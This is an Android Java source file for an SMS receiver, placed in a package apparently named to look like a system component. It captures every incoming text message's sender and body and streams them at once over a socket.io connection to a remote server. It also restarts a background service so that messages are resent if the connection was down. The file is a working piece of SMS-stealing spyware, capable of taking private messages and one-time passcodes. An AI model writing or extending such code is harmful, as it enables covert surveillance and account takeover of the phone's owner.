package com.example.systemframework;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import io.socket.client.Socket;

public class SmsReceiver extends BroadcastReceiver {
    private static Socket mSocket;

    public static void setSocket(Socket socket) {
        mSocket = socket;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            String format = bundle.getString("format");

            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                    } else {
                        sms = SmsMessage.createFromPdu((byte[]) pdu);
                    }

                    String sender = sms.getOriginatingAddress();
                    String message = sms.getMessageBody();

                    // ✅ STEP 1: Agar socket online hai toh turant bhejo (No Delay)
                    if (mSocket != null && mSocket.connected()) {
                        mSocket.emit("phone_data", "⚡ [LIVE SMS] From " + sender + " -> " + message);
                    }

                    // ✅ STEP 2: Service ko trigger karo taaki database update ho jaye
                    // aur agar socket offline tha toh reconnect hone par data bhej de
                    MyBackgroundService serviceInstance = MyBackgroundService.getInstance();
                    if (serviceInstance != null) {
                        serviceInstance.readSMSInstant();
                    } else {
                        // Agar service band hai toh ise turant restart karo
                        Intent serviceIntent = new Intent(context, MyBackgroundService.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            context.startForegroundService(serviceIntent);
                        } else {
                            context.startService(serviceIntent);
                        }
                    }
                }
            }
        }
    }
}